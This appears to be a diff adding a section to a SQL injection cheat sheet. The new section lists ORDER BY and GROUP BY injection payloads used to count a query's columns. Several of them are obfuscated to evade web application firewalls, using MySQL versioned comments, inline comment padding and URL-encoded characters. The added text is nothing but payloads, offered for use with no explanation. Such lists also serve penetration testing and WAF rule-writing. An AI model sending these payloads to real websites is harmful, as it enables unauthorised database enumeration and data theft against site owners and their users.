@@ -143,6 +143,25 @@ https://pentest-tools.com/website-vulnerability-scanning/sql-injection-scanner-o
 %60
 ;%00
 ```
+>next order by
+```
+ORDER BY 9
+order by 9
+ORDER BY 1,2,3,4,5,6,7,8,9
+/*!50000ORDER*/ 9
++ORDER BY/**_**/9
++/*!order/**/by*/1
++AND+MOD(52,12)+/*!50000GROUP*/+BY+100
++/*!50000GROUP*/+/*!50000BY*/+100
+23%0AORDER%23%0ABY%23%0A100
++AND+MOD(29,9)+/*!50000ORDER/**_**/*/+/*!50000BY/**_**/*/+100
+/*!50000BY/**_**/*/
++/*!12345ORDER*/+/*!12345BY*/100
++ORDER+BY+100+ASC
+%2f**%2fORDER%2f**%2fBY%2f**%2f100
+```
+
+
 
 
 
